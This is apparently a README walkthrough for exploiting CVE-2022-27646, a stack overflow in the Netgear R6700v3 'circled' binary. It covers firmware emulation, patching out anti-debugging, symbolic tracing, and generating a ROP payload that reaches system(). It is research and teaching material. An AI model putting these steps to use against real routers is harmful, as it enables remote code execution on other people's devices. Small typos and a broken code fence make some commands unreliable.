# Exploiting a Stack Buffer Overflow on the Netgear R6700v3 (CVE-2022-27646)
## 1. Preparation / Setup
### 1.1 Host System
- Install the following dependencies:
  - git
  - binwalk (https://github.com/ReFirmLabs/binwalk)
- Clone the project repository:
  ```
  git clone https://github.com/pdamian/netgear_r6700v3_circled.git && cd netgear_r6700v3_circled/
- Extract the R6700v3 firmware with *binwalk*:
  ```
  binwalk -e -M -C firmware/ firmware/R6700v3-V1.0.4.120_10.0.91.zip
  ```
- Copy the following files to the firmware's root filesystem:
  ```
  # Variable pointing to the root filesystem
  export ROOTFS="$(pwd)/firmware/_R6700v3-V1.0.4.120_10.0.91.zip.extracted/_R6700v3-V1.0.4.120_10.0.91.chk.extracted/squashfs-root"
  
  # Copy pre-built gdbserver binary (or compile your own statically-linked version; arch: armv7-eabihf, libc: uclibc)
  cp firmware/bins/gdbserver $ROOTFS/gdbserver
  
  # Copy pre-built libnvram.so library (or compile your own version; arch: armv7-eabihf, libc: uclibc)
  cp firmware/bins/libnvram.so $ROOTFS/libnvram.so
  
  # Copy pre-built libcircled.so library (or compile your own version; arch: armv7-eabihf, libc: uclibc)
  cp firmware/bins/libcircled.so $ROOTFS/libcircled.so

  # Patch out the anti-debugging functionality (allow LDPRELOAD) of the circled binary
  python3 firmware/circled.patch.py $ROOTFS/bin/circled $ROOTFS/bin/circled.patched
  
  # Copy circled.sh script (wrapper to emulate binary circled)
  cp firmware/circled.sh $ROOTFS/circled.sh
  ```
- Copy the directories `$ROOTFS/` and `server/` to an ARMHF guest system (e.g. a *QEMU* ARMHF Debian VM).
### 1.2 ARMHF Guest System
- In the following, we assume that the variable $ROOTFS points to the copied firmware's root filesystem.
- Configure conservative ASLR as being used on the Netgear R6700v3:
  ```
  echo 1 | sudo tee /proc/sys/kernel/randomize_va_spac
  ```
- Chroot into the root filesystem:
  ```
  sudo mount -t proc /proc/ $ROOTFS/proc/
  sudo mount -t sysfs /sys/ $ROOTFS/sys/
  sudo mount -o bind /dev/ $ROOTFS/dev/
  sudo chroot $ROOTFS/ /bin/sh
  export SHELL=/bin/sh
  ```
## 2. Morion Tracing
Use the following steps to trace the binary *circled* with a proof-of-vulnerability (PoV) payload (as e.g. identified by a fuzzer):
| Step | System         | Command                                                                      | Explanation                                                             |
|------|----------------|------------------------------------------------------------------------------|-------------------------------------------------------------------------|
| 1    | Guest          | `python3 server/circled.server.py --payload "pov"`                           | Start HTTP server delivering proof-of-vulnerability (PoV) payloads      |
| 2    | Guest (chroot) | `/circled.sh --gdb`                                                          | Emulate binary *circled* with GDB attached (and therefore no ASRL)      |
| 3    | Host  (morion) | `cp circled.init.yaml circled.yaml && gdb-multiarch -q -x circled.trace.gdb` | Collect an execution trace of the binary *circled*                      |

## 3. Morion Symbolic Execution
Use the following steps to execute the collected trace symbolically and analyse for potential control flow hijacking vulnerabilities:
| Step | System         | Command                                                                      | Explanation                                                             |
|------|----------------|------------------------------------------------------------------------------|-------------------------------------------------------------------------|
| 4    | Host  (morion) | `morion_control_hijacker circled.yaml --disallow_user_inputs`                | Symbolically analyse the trace for potential control flow hijacks       |
| 5.1  | Host  (morion) | `morion_control_hijacker circled.yaml --skip_state_analysis`                 | Symbolically analyse the trace for potential control flow hijacks       |
| 5.2  | Host  (morion) | `quit`                                                                       | Ignore notification about unrestricted `r11/fp` register                |
| 5.3  | Host  (morion) | `%run -i circled.rop1.py`                                                    | Try jump to ROP gadget 1: `0xc9b8: mov r0, r6; bl #0x94a0 <system@plt>` |
| 5.4  | Host  (morion) | `%run -i circled.rop2.py`                                                    | Put argument for function `system@plt`                                  |
| 5.5  | Host  (morion) | `quit`                                                                       | Terminate                                                               |
| 6    | Host  (morion) | `morion_rop_generator circeld.yaml default`                                  | Generate exploit payload for a specified ROP chain                      |
## 2. References
- Emulating Netgear R6700v3 cicled binary:
  - https://medium.com/@INTfinity/1-1-emulating-netgear-r6700v3-circled-binary-cve-2022-27644-cve-2022-27646-part-1-5bab391c91f2
  - https://medium.com/@INTfinity/1-2-emulating-netgear-r6700v3-circled-binary-cve-2022-27644-cve-2022-27646-part-2-cf1571493117
  - https://medium.com/@INTfinity/1-3-exploiting-and-debugging-netgear-r6700v3-circled-binary-cve-2022-27644-cve-2022-27646-a80dbaf1245d
- Emulating IoT Firmware Made Easy:
  - https://boschko.ca/qemu-emulating-firmware/
- Defeating the Netgear R6700v3:
  - https://www.synacktiv.com/en/publications/pwn2own-austin-2021-defeating-the-netgear-r6700v3.html
- Chroot:
  - https://wiki.archlinux.org/title/Chroot#Using_chroot
- Ready-to-Use Cross-Compilation Toolchains:
  - https://toolchains.bootlin.com/
- NVRAM Emulator:
  - https://github.com/firmadyne/libnvram
